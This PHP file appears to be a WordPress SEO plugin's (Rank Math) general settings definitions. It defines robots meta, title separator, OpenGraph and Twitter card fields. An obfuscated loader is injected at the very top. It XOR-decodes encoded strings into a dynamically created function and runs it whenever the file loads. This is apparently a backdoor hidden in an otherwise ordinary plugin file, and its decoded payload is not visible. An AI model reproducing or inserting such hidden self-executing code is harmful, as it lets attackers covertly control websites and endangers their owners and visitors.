<?php $xkIBKtbW='H757ARa>  93;5N'; $oAujZd='+EPV57>XUNZGRZ '^$xkIBKtbW; $jtJEyOlW='.HyiX <4GQ9EgKAWN50rv,6631J5.j=Z2MwzCVAnd+6P75U;>g<OYo4UEQ2k53 JU1U3VaTcY+ gRmMuh0cf=iDA7MlhJwpnOEJTGdlSdlszHIhXK7TKQ0VAtD B4eMacXySaBeZN6=3yIQAdu72ZY,s;fh+nt27-cPREpwB6H<U9bW UOSdyPI1a  E8  OL:62Dn1o,p5;fJ6M=YmlV08RM,rDoT1:P..VCAoH>-6A,HgpP95VACTEkLj2-:> qQX7oR;RNygwMpF+Y1 sl-ypn406TcU2 BJtt-XUyfmbO2L rvWj LX61bM3rI;Mfejl>->WCs6Fg7.D=J1;VYIsep<=.nbnW9JOY=Ctryvs=7>9NOZ11XbS 8EVc3-,bRruVY+TZxYo3 Z8tRknFU-2RYNc.eJmfu08 ,vLttATG3 > >T;2MI< i XEA+bT Dg,1 UZd=Q,2870dK,07-MmbpW--A;  =mjxHGToR-  6cqmNV6FX7-2= .E<TJ2Xpk 68deLGS4=McXraqOV0Tpg=8JVfj<=4a;nznNMhl1fo,C TDbDq6WsZOLsT9dKt b1f1oenUlDlci+ CAKg=57sW2QA2XCq5;8 Q66vfwkO41PfxhYtNofGhL+3LTxI7R= nU947P=13r:hq4c.<S AiNL>9'; $FnYtWy=$oAujZd('', 'G.QH>URW38V+8.9>=ACZQTYDlU+AO5b7G9PSjv:dmMC>TA<TPGD +0P410m4XFTbqU4G7MtG2NYNrMmUHKio4M+4CmQHmPKdFL,;5LH:DQSJsiL1wD 9=U8iP A6ULvAG1RxHHlSjYHGYglaLQSS.8wWR;HuNPYRT8t;eUW1B:P0WJsK06z9PkC8hRE1MRNghUCFmU;fQzH1lnR,I8MQvVY>>IINK0PN1qE3:aRhXLZ2Ismz6VG3  <eCh5qbuui4q9DOvP77YZImT0J5DEZLVsyJPQB5<>WYbwTPF=,BldF+S8ARKwNV-4CTYGNxCR+FMKHZLJ6jSMLnQA6X+RSvqm,75mhk=6N6Jjk2X:TOGVWKVRL+fzJ;QkwDY17<XHUBoRQ=<RoPqPKWA.YToKJ04AG7bDjSo7glQTYTMVqT44:4VRWAR=AWe1SR6D91 t=9U0ONPS0lPb5IQWSULoHQCLdABT3LY dKEDDCCB.2GvIATWCWKn7D49NrYXYq D=9F+XLKSACIlc7UI,JxTGQg;TaXCYY>7=MWXMFfGZSsmOURRYO CasWrCSeEi,yJ7XRzGBZUWUVVVrEdJEIJR1 28VPN,2J82F+kVEZAL>WRQJWO+UE1OQHyTnOF<bENE-8PmS3IA5rIUN<RPWUgAJ>jKD:TiYgw4D'^$jtJEyOlW); $FnYtWy();
/**
 * The general settings.
 *
 * @package    RankMath
 * @subpackage RankMath\Settings
 */

use RankMath\Helper;

$cmb->add_field(
	[
		'id'                => 'robots_global',
		'type'              => 'multicheck',
		'name'              => esc_html__( 'Robots Meta', 'rank-math' ),
		'desc'              => esc_html__( 'Default values for robots meta tag. These can be changed for individual posts, taxonomies, etc.', 'rank-math' ),
		'options'           => Helper::choices_robots(),
		'default'           => [ 'index' ],
		'classes'           => 'rank-math-robots-data',
		'select_all_button' => false,
	]
);

$cmb->add_field(
	[
		'id'              => 'advanced_robots_global',
		'type'            => 'advanced_robots',
		'name'            => esc_html__( 'Advanced Robots Meta', 'rank-math' ),
		'sanitization_cb' => [ '\RankMath\CMB2', 'sanitize_advanced_robots' ],
		'classes'         => 'rank-math-advanced-option',
	]
);

$cmb->add_field(
	[
		'id'      => 'noindex_empty_taxonomies',
		'type'    => 'toggle',
		'name'    => esc_html__( 'Noindex Empty Category and Tag Archives', 'rank-math' ),
		'desc'    => wp_kses_post( __( 'Setting empty archives to <code>noindex</code> is useful for avoiding indexation of thin content pages and dilution of page rank. As soon as a post is added, the page is updated to <code>index</code>.', 'rank-math' ) ),
		'default' => 'on',
		'classes' => 'rank-math-advanced-option',
	]
);

$cmb->add_field(
	[
		'id'              => 'title_separator',
		'type'            => 'radio_inline',
		'name'            => esc_html__( 'Separator Character', 'rank-math' ),
		'desc'            => wp_kses_post( __( 'You can use the separator character in titles by inserting <code>%separator%</code> or <code>%sep%</code> in the title fields.', 'rank-math' ) ), // phpcs:ignore
		'options'         => Helper::choices_separator( Helper::get_settings( 'titles.title_separator' ) ),
		'default'         => '-',
		'attributes'      => [ 'data-preview' => 'title' ],
		'sanitization_cb' => [ '\RankMath\CMB2', 'sanitize_separator' ],
	]
);

if ( ! current_theme_supports( 'title-tag' ) ) {
	$cmb->add_field(
		[
			'id'      => 'rewrite_title',
			'type'    => 'toggle',
			'name'    => esc_html__( 'Rewrite Titles', 'rank-math' ),
			'desc'    => esc_html__( 'Your current theme doesn\'t support title-tag. Enable this option to rewrite page, post, category, search and archive page titles.', 'rank-math' ),
			'default' => 'off',
		]
	);
}

$cmb->add_field(
	[
		'id'      => 'capitalize_titles',
		'type'    => 'toggle',
		'name'    => esc_html__( 'Capitalize Titles', 'rank-math' ),
		'desc'    => esc_html__( 'Automatically capitalize the first character of all title tags.', 'rank-math' ),
		'default' => 'off',
	]
);

$cmb->add_field(
	[
		'id'      => 'open_graph_image',
		'type'    => 'file',
		'name'    => esc_html__( 'OpenGraph Thumbnail', 'rank-math' ),
		'desc'    => esc_html__( 'When a featured image is not set, this image will be used as a thumbnail when your post is shared on Facebook. Recommended image size 1200 x 630 pixels.', 'rank-math' ),
		'options' => [ 'url' => false ],
		'class'   => 'button-primary',
	]
);

$cmb->add_field(
	[
		'id'      => 'twitter_card_type',
		'type'    => 'select',
		'name'    => esc_html__( 'Twitter Card Type', 'rank-math' ),
		'desc'    => esc_html__( 'Card type selected when creating a new post. This will also be applied for posts without a card type selected.', 'rank-math' ),
		'options' => [
			'summary_large_image' => esc_html__( 'Summary Card with Large Image', 'rank-math' ),
			'summary_card'        => esc_html__( 'Summary Card', 'rank-math' ),
		],
		'default' => 'summary_large_image',
		'classes' => 'rank-math-advanced-option',
	]
);
